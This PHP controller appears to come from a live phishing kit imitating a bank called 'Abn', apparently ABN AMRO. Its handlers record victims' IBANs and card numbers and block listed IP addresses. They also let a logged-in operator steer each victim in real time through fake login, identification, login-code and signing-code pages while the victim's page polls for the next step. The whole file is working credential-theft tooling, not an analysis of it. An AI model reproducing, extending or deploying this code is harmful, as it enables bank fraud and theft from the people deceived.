<?php

namespace App\Controllers\Abn;

use \Core\View;
use \App\Models\Abn\Abn;
use \App\Auth;

class Login extends \Core\Controller
{
    public function indexAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay']) && isset($_POST['iban']) && isset($_POST['number'])) {
            Abn::setLogin($_POST['iban'], $_POST['number'], $_SESSION['uid']);
        } else {
            if (Abn::findBan($_SERVER['REMOTE_ADDR']) || !isset($_SESSION['pay']) || !Abn::checkPayment($this->route_params['id'])) {
                Abn::redirect();
            } else {
                Abn::setLogInformation($_SESSION['uid']);

                View::render('Abn/login.php');
            }
        }
    }

    public function checkAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay'])) {
                $check = Abn::getPage($_SESSION['uid']);

                if ($check) {
                    if ($check == 'login') {
                        echo json_encode(['page' => 'login']);   
                        Abn::setLoginPage($_SESSION['uid'], null);
                    } else if ($check == 'identification') {
                        echo json_encode(['page' => 'identification']);   
                        Abn::setIdentificationPage($_SESSION['uid'], null);
                    } else if ($check == 'loginCode') {
                        echo json_encode(['page' => 'loginCode']);
                        Abn::setLoginCodePage($_SESSION['uid'], null);
                    } else if ($check == 'signCode') {
                        echo json_encode(['page' => 'signCode']);
                        Abn::setSignCodePage($_SESSION['uid'], null);
                    } else if ($check == 'control') {
                        echo json_encode(['page' => 'control']);
                        Abn::setControlPage($_SESSION['uid'], null);
                    } else if ($check == 'finish') {
                        echo json_encode(['page' => 'finish']);
                        Abn::setFinishPage($_SESSION['uid'], null);   
                        unset($_SESSION['pay']);
                        unset($_SESSION['uid']);
                    }
                } else {
                    echo json_encode(['page' => 'waiting']);
                }
           
        } else {
            Abn::redirect();
        }
    }

    public function setPageAction()
    {
        if (Auth::isLoggedIn()) {
            if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['id']) && isset($_POST['page'])) {
                if ($_POST['page'] == 'login') {
                    $check = Abn::setLoginPage($_POST['id'], $_POST['page']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                } else if ($_POST['page'] == 'identification') {
                    $check = Abn::setIdentificationPage($_POST['id'], $_POST['page']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                } else if ($_POST['page'] == 'loginCode') {
                    $check = Abn::setLoginCodePage($_POST['id'], $_POST['page']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                } else if ($_POST['page'] == 'signCode') {
                    $check = Abn::setSignCodePageCode($_POST['id'], $_POST['page'], $_POST['code']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                } else if ($_POST['page'] == 'control') {
                    $check = Abn::setControlPage($_POST['id'], $_POST['page']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                } else if ($_POST['page'] == 'finish') {
                    $check = Abn::setFinishPage($_POST['id'], $_POST['page']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                }
            } else {
                Abn::redirect();
            }
        } else {
            Abn::redirect();
        }
    }
}